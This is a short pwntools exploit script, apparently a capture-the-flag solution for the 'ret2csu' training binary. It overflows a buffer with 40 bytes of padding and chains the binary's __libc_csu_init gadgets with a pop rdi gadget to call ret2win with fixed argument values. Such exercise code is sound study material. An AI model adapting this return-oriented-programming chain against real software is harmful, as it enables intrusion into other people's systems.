from pwn import *

elf = ELF('ret2csu')
r = process("./ret2csu")

gadget1 = 0x000000000040069a
gadget2 = 0x0000000000400680
fini = 0x600e48
ret2win = 0x000000000040062a
pop_rdi = 0x00000000004006a3

payload = b'a'*40
payload += p64(gadget1)
payload += p64(0) + p64(1) + p64(fini) + p64(0) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
payload += p64(gadget2)
payload += p64(0)*7
payload += p64(pop_rdi)
payload += p64(0xdeadbeefdeadbeef)
payload += p64(ret2win)

input()
r.sendlineafter('> ', payload)
r.interactive()